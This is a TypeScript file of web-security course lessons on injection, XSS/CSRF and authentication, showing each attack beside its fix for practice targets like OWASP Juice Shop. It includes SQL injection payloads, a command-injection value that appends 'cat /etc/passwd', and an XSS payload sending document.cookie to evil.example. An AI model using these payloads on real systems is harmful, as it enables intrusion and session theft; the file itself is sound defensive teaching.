import { lesson, module } from "@/lib/lesson-builder";
import type { CourseModule } from "@/lib/courses";

/**
 * Security — web security, ethical hacking and defensive security.
 *
 * Three modules following the program outline. Everything offensive here is
 * taught against deliberately vulnerable practice targets (OWASP Juice Shop,
 * DVWA, your own VMs); the legal and ethical framing is part of the content,
 * not a footnote.
 */

export const CYBER_SECURITY_OFFENSE_AND_DEFENSE_MODULES: CourseModule[] = [
  module("web-security", "01 · Web security", "The attacks behind most real breaches, and the code that stops them.", [
    lesson({
      id: "injection-attacks",
      title: "Injection: SQL and command",
      summary:
        "Injection happens whenever data a user typed is treated as code. It has been near the top of the OWASP Top Ten for twenty years because it is easy to write by accident and devastating when found. This lesson shows exactly how SQL injection and command injection work, how to find them, and the one habit that eliminates them: never build code out of strings.",
      sections: [
        {
          heading: "What injection is",
          kind: "definition",
          body:
            "**Injection** is a vulnerability where untrusted input changes the *structure* of a command instead of just supplying a *value* inside it. The program meant to ask \"find the user named X\"; the attacker makes it ask \"find the user named X, or everyone\".\n\nIt appears wherever a program assembles a command from text: SQL queries, shell commands, LDAP filters, even HTML (which is why cross-site scripting is a cousin). The fix is always the same shape: **keep code and data separate** by using an API that accepts them as separate arguments. Parameterised queries for SQL, argument arrays for processes.",
        },
        {
          heading: "Worked example: SQL injection, step by step",
          kind: "example",
          body:
            "The login below builds its query with string concatenation. Trace what happens when the attacker types `' OR '1'='1` as the username and anything as the password.\n\n1. The developer intended: `SELECT * FROM users WHERE name = 'ama' AND password = 'secret'`.\n2. With the payload, the query becomes: `SELECT * FROM users WHERE name = '' OR '1'='1' AND password = 'x'`.\n3. `'1'='1'` is always true, so the `WHERE` matches rows regardless of the password. The first user in the table is returned, and that is usually the administrator.\n\nA comment sequence makes it cleaner: username `admin'--` turns the rest of the line into a comment, so the password check disappears entirely. The fixed version passes the values separately; the database never parses them as SQL.",
          code:
            "# VULNERABLE: the input becomes part of the SQL text\nquery = f\"SELECT * FROM users WHERE name = '{username}' AND password = '{password}'\"\ncursor.execute(query)\n\n# FIXED: placeholders; the driver sends values out-of-band\ncursor.execute(\n    \"SELECT * FROM users WHERE name = %s AND password_hash = %s\",\n    (username, hash_password(password)),\n)",
          language: "python",
          codeLabel: "The same query, broken and fixed",
        },
        {
          heading: "Command injection",
          kind: "paragraph",
          body:
            "Same idea, different interpreter. A \"ping this host\" feature that runs `ping -c 1 \" + host` lets an attacker supply `8.8.8.8; cat /etc/passwd`. The shell sees two commands.\n\nThe fix is to never go through a shell with user data: pass arguments as a list (`subprocess.run([\"ping\", \"-c\", \"1\", host])`), validate the input against what it should look like (an IP address matches a tight regex), and run the service as a user with no interesting permissions so that a bypass gains little.",
          code:
            "import re, subprocess\n\nIPV4 = re.compile(r\"^\\d{1,3}(\\.\\d{1,3}){3}$\")\n\ndef ping(host: str) -> str:\n    if not IPV4.match(host):\n        raise ValueError(\"not an IPv4 address\")\n    result = subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True, timeout=5)\n    return result.stdout",
          language: "python",
          codeLabel: "Allow-list the input, never use shell=True",
        },
        {
          heading: "Common mistakes and misconceptions",
          kind: "warning",
          body:
            "- **Escaping quotes by hand.** Every hand-rolled escaper has been bypassed. Use parameters.\n- **Validating on the client only.** The attacker does not use your form; they use `curl`.\n- **Blocking the word `SELECT`.** Attackers write `SeLeCt`, or use encodings. Deny-lists lose; parameters win.\n- **Thinking an ORM makes you safe.** Most ORMs have a raw-query escape hatch, and that is where injection returns.",
        },
      ],
      challenge:
        "Install OWASP Juice Shop locally (one Docker command). Find the login SQL injection, log in as admin, then open the source and write the parameterised query that would have stopped you.",
      keyPoints: [
        "Define injection as input changing the structure of a command",
        "Trace how a payload rewrites a concatenated SQL query",
        "Fix SQL injection with parameterised queries",
        "Fix command injection with argument lists and strict input validation",
      ],
      exercises: [
        "Why does `admin'--` work against the vulnerable login? What does the final query look like?",
        "A search box runs `LIKE '%\" + term + \"%'`. Write the injection and the fix.",
        "Explain to a product manager why \"we filter out bad words\" is not a defence.",
        "Find one raw-query call in any open-source project and judge whether it is safe.",
      ],
    }),
    lesson({
      id: "xss-csrf-and-browser-defences",
      title: "XSS, CSRF and the browser's defences",
      summary:
        "The browser is where web attacks land. Cross-site scripting runs the attacker's JavaScript in your user's session; cross-site request forgery makes the user's browser act without their knowledge. This lesson explains both precisely, demonstrates them against a practice app, and covers the modern defences: output encoding, Content Security Policy, SameSite cookies and the tokens that frameworks add for you.",
      sections: [
        {
          heading: "Cross-site scripting (XSS)",
          kind: "definition",
          body:
            "**XSS** is injection into HTML. If a page prints user input without encoding it, the input can contain `<script>` and the browser will run it *as the site*: reading cookies, making requests with the victim's session, rewriting the page to capture a password.\n\nThree flavours:\n\n- **Stored**: the payload is saved (a comment, a profile name) and runs for everyone who views it.\n- **Reflected**: the payload is in a URL and runs when the victim clicks a crafted link.\n- **DOM-based**: client-side JavaScript itself writes untrusted data into the page with `innerHTML`.\n\nThe defence is **contextual output encoding**: turn `<` into `&lt;` when writing into HTML, and use the right encoding for attributes, URLs and JavaScript. Modern frameworks (React, Vue, templating engines) do this by default — the danger is the escape hatch (`dangerouslySetInnerHTML`, `v-html`, `innerHTML`).",
          code:
            "// Stored XSS payload typed into a product review field:\n<img src=x onerror=\"fetch('https://evil.example/steal?c='+document.cookie)\">\n\n// Safe rendering in React: the text is encoded automatically\n<p>{review.body}</p>\n\n// Dangerous: trusts the string as markup\n<p dangerouslySetInnerHTML={{ __html: review.body }} />",
          language: "jsx",
          codeLabel: "A payload with no <script> tag at all",
        },
        {
          heading: "Cross-site request forgery (CSRF)",
          kind: "paragraph",
          body:
            "Browsers attach cookies to every request to a site, including requests started by *another* site. So if your bank changes the email address on a plain `POST /settings`, a hidden form on an attacker's page can submit that request from the victim's logged-in browser.\n\nDefences, in the order you should apply them:\n\n1. **`SameSite=Lax` or `Strict` on the session cookie.** The browser will not send it on cross-site POSTs. Default in modern browsers, but set it explicitly.\n2. **CSRF tokens.** A random value tied to the session, included in every state-changing form and checked on the server. Most frameworks (Django, Rails, Next.js server actions) handle this.\n3. **Never change state on GET.** A link should not delete anything.",
        },
        {
          heading: "Content Security Policy",
          kind: "example",
          body:
            "**CSP** is an HTTP header that tells the browser which sources of script, style and images are allowed. Even if an XSS payload gets into the page, a strict policy stops it from running or from sending data to the attacker's server. Start with a report-only policy to see what would break, then enforce.",
          code:
            "Content-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-r4nd0m';\n  img-src 'self' data: https://cdn.codemasterghana.com;\n  connect-src 'self' https://api.paystack.co;\n  frame-ancestors 'none';\n  base-uri 'self';\n\nSet-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/",
          language: "text",
          codeLabel: "Two headers that defeat most of this lesson",
        },
        {
          heading: "Common mistakes and misconceptions",
          kind: "warning",
          body:
            "- **Filtering `<script>` and calling it done.** Event handlers (`onerror`, `onload`) and `javascript:` URLs do not need the tag.\n- **Forgetting `HttpOnly`.** Without it, any XSS can read the session cookie directly.\n- **`unsafe-inline` in CSP.** It switches CSP off for scripts. Use nonces or hashes.\n- **Assuming an API is immune to CSRF because it returns JSON.** If it accepts form-encoded POSTs with cookie auth, it is not.",
        },
      ],
      challenge:
        "In Juice Shop, find a stored XSS and a reflected XSS. Then add a Content-Security-Policy header (via a reverse proxy or browser extension) and show that the same payload no longer executes.",
      keyPoints: [
        "Distinguish stored, reflected and DOM-based XSS",
        "Explain why output encoding, not input filtering, stops XSS",
        "Describe how CSRF abuses the browser's cookie behaviour and the three defences",
        "Write a starting Content Security Policy and secure cookie flags",
      ],
      exercises: [
        "Why does `HttpOnly` not stop an attacker from *using* a session via XSS, even though they cannot read the cookie?",
        "A site uses a bearer token in `localStorage` instead of cookies. Which of XSS and CSRF gets worse, and which gets better?",
        "Write the CSP for a page that loads scripts only from itself and fonts from Google Fonts.",
        "Find the escape hatch in a framework you use and grep a project for it.",
      ],
    }),
    lesson({
      id: "authentication-and-access-control",
      title: "Authentication, sessions and access control",
      summary:
        "Broken access control is now the number one web vulnerability. It is not clever; it is a server that forgets to check who is asking. This lesson covers how to store passwords, how sessions and JWTs work and fail, multi-factor authentication, and the systematic way to test every endpoint for the question 'but am I allowed?'.",
      sections: [
        {
          heading: "Storing passwords",
          kind: "paragraph",
          body:
            "Never store a password. Store a **slow, salted hash** of it: `bcrypt`, `scrypt` or `argon2id`. Slow matters: an attacker with a leaked database tries billions of guesses per second against a fast hash like MD5 or SHA-256, and thousands per second against bcrypt. The **salt** is a random value stored alongside the hash so that two users with the same password have different hashes and precomputed tables are useless.\n\nAlso: enforce a minimum length (12+), check new passwords against known-breached lists, rate-limit login attempts per account *and* per IP, and never say which of username or password was wrong.",
          code:
            "import bcrypt\n\ndef hash_password(plain: str) -> bytes:\n    return bcrypt.hashpw(plain.encode(), bcrypt.gensalt(rounds=12))\n\ndef verify(plain: str, stored: bytes) -> bool:\n    return bcrypt.checkpw(plain.encode(), stored)",
          language: "python",
          codeLabel: "The whole of password storage, correctly",
        },
        {
          heading: "Sessions and tokens",
          kind: "definition",
          body:
            "After login the server must recognise the user on later requests. Two designs:\n\n- **Server-side sessions**: a random ID in a cookie, looked up in a store. Easy to revoke (delete the row). The cookie must be `HttpOnly; Secure; SameSite`.\n- **JWTs**: a signed token the client holds; the server verifies the signature and trusts the claims inside. Scales without a store, but *cannot be revoked* before expiry, so keep lifetimes short and pair with a refresh token.\n\nJWT mistakes to test for: accepting `alg: none`, using a weak HMAC secret that can be cracked offline, confusing RS256 and HS256, and not checking `exp`.",
        },
        {
          heading: "Worked example: insecure direct object reference",
          kind: "example",
          body:
            "An invoices page fetches `/api/invoices/1042`. You are logged in as yourself. Change the number to `1041`. If you see someone else's invoice, the server checked that you are *logged in* but not that you *own* the resource. This is **IDOR**, the most common form of broken access control, and it is found by nothing more than changing a number.\n\nThe fix is a query that includes the owner, so that a wrong ID simply returns nothing.",
          code:
            "# BROKEN: authenticated, but not authorised\ninvoice = db.query(\"SELECT * FROM invoices WHERE id = %s\", (invoice_id,))\n\n# FIXED: the owner is part of the lookup\ninvoice = db.query(\n    \"SELECT * FROM invoices WHERE id = %s AND user_id = %s\",\n    (invoice_id, current_user.id),\n)\nif invoice is None:\n    abort(404)   # not 403: do not confirm the record exists",
          language: "python",
          codeLabel: "Authorisation belongs in the query",
        },
        {
          heading: "Common mistakes and misconceptions",
          kind: "warning",
          body:
            "- **Checking roles in the UI only.** Hiding the Delete button is not authorisation. The API must refuse.\n- **Sequential IDs plus no ownership check.** Use UUIDs *and* check ownership; UUIDs alone are obscurity, not security.\n- **SMS as the only second factor.** SIM-swap fraud is common in Ghana. Prefer authenticator apps or passkeys.\n- **Long-lived JWTs with no refresh.** A stolen token is valid until it expires; make that minutes, not months.",
        },
      ],
      challenge:
        "Pick any app you have built or have permission to test. For every endpoint, make a table: who should be allowed, then try it as a different user, as a logged-out user, and with another user's ID. Fix every row that fails.",
      keyPoints: [
        "Hash passwords with bcrypt/argon2 and explain why slow hashes matter",
        "Compare server sessions with JWTs and their failure modes",
        "Find IDOR by changing identifiers and fix it in the query",
        "Test authorisation systematically rather than hoping",
      ],
      exercises: [
        "Why return 404 rather than 403 for an invoice the user does not own?",
        "A JWT has `exp` thirty days out. List the consequences if it leaks and two mitigations.",
        "Why is 'incorrect password' a worse error message than 'incorrect username or password'?",
        "Design login rate limiting that stops brute force without letting an attacker lock out a victim.",
      ],
    }),
  ]),

];
